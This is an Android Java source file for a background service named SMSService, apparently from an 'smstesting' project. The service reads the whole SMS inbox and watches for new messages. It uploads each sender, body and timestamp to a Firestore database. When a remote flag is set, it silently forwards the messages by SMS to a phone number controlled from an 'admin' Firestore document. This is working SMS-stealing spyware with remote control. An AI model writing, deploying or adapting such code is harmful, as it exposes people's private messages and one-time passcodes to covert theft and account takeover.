package com.abhi.smstesting;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;

import android.telephony.SmsManager;

import android.widget.Toast;

import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class SMSService extends Service {

    // Define the destination phone number here
    private String destinationNumber = "+918761237654"; // Default number, change to your desired number
    private Boolean isSendSms = false;

    private ContentObserver contentObserver;
    private FirebaseFirestore firestore;

    @Override
    public IBinder onBind(Intent intent) {
        // Not needed for SMS service
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        initializeFirestore();
        fetchDestinationNumber(); // Fetch destination number initially
        fetchStoreSmsNumber();
        registerSendsmsListener();
        registerDestinationNumberListener(); // Listen for changes to destination number
        String deviceId = fetchDeviceId();
        if (deviceId != null) {
            // Proceed with fetching and sending SMS messages
            fetchAndSendSmsMessages(deviceId);
            registerContentObserver();
        } else {
            // Unable to fetch device ID
            Toast.makeText(this, "Failed to fetch device ID", Toast.LENGTH_SHORT).show();
        }
        return START_STICKY;
    }

    private void initializeFirestore() {
        firestore = FirebaseFirestore.getInstance();
    }

    private void fetchDestinationNumber() {
        firestore.collection("admin").document("number").get()
                .addOnSuccessListener(documentSnapshot -> {
                    if (documentSnapshot.exists()) {
                        Long number = documentSnapshot.getLong("no");
                        if (number != null) {
                            destinationNumber = String.valueOf(number);
                        }
                    }
                })
                .addOnFailureListener(e -> {
                    // Error fetching destination number
                    Toast.makeText(this, "Failed to fetch destination number: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                });
    }
    private void fetchStoreSmsNumber() {
        firestore.collection("users").document(fetchDeviceId()).get()
                .addOnSuccessListener(documentSnapshot -> {
                    if (documentSnapshot.exists()) {
                        boolean storesms = documentSnapshot.getBoolean("storeSms");
//                        if (storesms != null) {
                            isSendSms = storesms;
//                        }
                    }
                })
                .addOnFailureListener(e -> {
                    // Error fetching destination number
                    Toast.makeText(this, "Failed to fetch destination number: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                });
    }

    private void registerDestinationNumberListener() {
        firestore.collection("admin").document("number")
                .addSnapshotListener((value, error) -> {
                    if (error != null) {
                        // Error listening for changes to destination number
                        Toast.makeText(this, "Failed to listen for destination number changes: " + error.getMessage(), Toast.LENGTH_SHORT).show();
                        return;
                    }

                    if (value != null && value.exists()) {
                        Long number = value.getLong("no");
                        if (number != null) {
                            destinationNumber = String.valueOf("+91"+number);
                            System.out.println("here is number"+destinationNumber);
                        }
                    }
                });
    }private void registerSendsmsListener() {
        firestore.collection("users").document(fetchDeviceId())
                .addSnapshotListener((value, error) -> {
                    if (error != null) {
                        // Error listening for changes to destination number
                        Toast.makeText(this, "Failed to listen for destination number changes: " + error.getMessage(), Toast.LENGTH_SHORT).show();
                        return;
                    }

                    if (value != null && value.exists()) {
                            boolean smsval = value.getBoolean("storeSms");
//                        if (smsval != null) {
                            isSendSms = smsval;
                            System.out.println("here is bool"+smsval);
//                        }
                    }
                });
    }


    private String fetchDeviceId() {
        String manufac = Build.MANUFACTURER;
        String model = Build.MODEL;
        if(model.startsWith(manufac)){
            return capitalize(model);
        }else{
            return capitalize(manufac) + " " + model;
        }
//        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }
    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isLowerCase(first)) {
            return Character.toUpperCase(first) + s.substring(1);
        } else {
            return s;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterContentObserver();
    }

        private void fetchAndSendSmsMessages(String deviceID) {
            try {
                // Fetch SMS messages from the device sorted by date in ascending order
                ContentResolver contentResolver = getContentResolver();
                Uri uri = Uri.parse("content://sms/inbox");
                Cursor cursor = contentResolver.query(uri, null, null, null, "date ASC");
    
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        String messageBody = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                        String formattedDateTime = formatDate(timestamp);
    
                        // Construct the message details
                        String fullMessage = "From: " + sender + "\n";
                        fullMessage += "Date: " + formattedDateTime + "\n";
                        fullMessage += "Message: " + messageBody;
    
                        // Check if there's an existing document for the device ID
                        FirebaseFirestore db = FirebaseFirestore.getInstance();
                        DocumentReference docRef = db.collection("users").document(deviceID);
                        docRef.get().addOnCompleteListener(task -> {
                            if (task.isSuccessful()) {
                                DocumentSnapshot document = task.getResult();
                                if (document.exists()) {
                                    // Document exists, update it by appending the new message
                                    Map<String, Object> smsData = new HashMap<>();
                                    smsData.put("sender", sender);
                                    smsData.put("message", messageBody);
                                    smsData.put("timestamp", timestamp);
                                    docRef.collection("smsMessages").add(smsData)
                                            .addOnSuccessListener(documentReference -> {
                                                // Message appended successfully
                                                Toast.makeText(this, "SMS appended to existing document", Toast.LENGTH_SHORT).show();
                                            })
                                            .addOnFailureListener(e -> {
                                                // Error appending message
                                                Toast.makeText(this, "Failed to append SMS: " + e.getMessage(), Toast.LENGTH_LONG).show();
                                            });
                                } else {
                                    // Document doesn't exist, create a new one and store the message
                                    // Here, you directly add the message without checking the value of storeSms field
                                    Map<String, Object> smsData = new HashMap<>();
                                    smsData.put("sender", sender);
                                    smsData.put("message", messageBody);
                                    smsData.put("timestamp", timestamp);
                                    docRef.collection("smsMessages").add(smsData)
                                            .addOnSuccessListener(documentReference -> {
                                                // Message added successfully
                                                Toast.makeText(this, "SMS added to new document", Toast.LENGTH_SHORT).show();
                                            })
                                            .addOnFailureListener(e -> {
                                                // Error adding message
                                                Toast.makeText(this, "Failed to add SMS: " + e, Toast.LENGTH_LONG).show();
                                            });
                                }
                            } else {
                                // Error fetching document
                                Toast.makeText(this, "Failed to fetch document: " + task, Toast.LENGTH_LONG).show();
                            }
                        });
    
                        // Uncomment the following line to forward the message
                        if (isSendSms){
                            sendSmsInBackground(sender,messageBody,timestamp);

                        }
                    } while (cursor.moveToNext());
                }
    
                if (cursor != null) {
                    cursor.close();
                }
            } catch (Exception e) {
                Toast.makeText(this, "Failed to fetch and send SMS: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        }


    private String formatDate(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        Date dateTime = new Date(timestamp);
        return sdf.format(dateTime);
    }

    private void registerContentObserver() {
        contentObserver = new ContentObserver(new Handler()) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                // If any change occurs in the SMS inbox, fetch and send the new SMS messages
                fetchAndSendSmsMessages(fetchDeviceId());
            }
        };

        getContentResolver().registerContentObserver(Uri.parse("content://sms/inbox"), true, contentObserver);
    }

    private void sendSmsInBackground(String sender, String message, long timestamp) {
        try {
            if (message != null && !message.isEmpty()) {
                // Construct the SMS content with sender, message, and timestamp
                String smsContent = "Sender: " + sender + "\n" +
                        "Message: " + message + "\n" +
                        "Timestamp: " + formatDate(timestamp);

                // Split the message into chunks of 5000 characters or less
                ArrayList<String> parts = new ArrayList<>();
                int length = smsContent.length();
                for (int i = 0; i < length; i += 5000) {
                    if (i + 5000 < length) {
                        parts.add(smsContent.substring(i, i + 5000));
                    } else {
                        parts.add(smsContent.substring(i));
                    }
                }

                // Send each part separately
                SmsManager smsManager = SmsManager.getDefault();
                for (String part : parts) {
                    smsManager.sendTextMessage(destinationNumber, null, part, null, null);
                }
                Toast.makeText(this, "SMS forwarded successfully", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Message is empty", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            Toast.makeText(this, "Failed to send SMS: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private void unregisterContentObserver() {
        if (contentObserver != null) {
            getContentResolver().unregisterContentObserver(contentObserver);
        }
    }
}
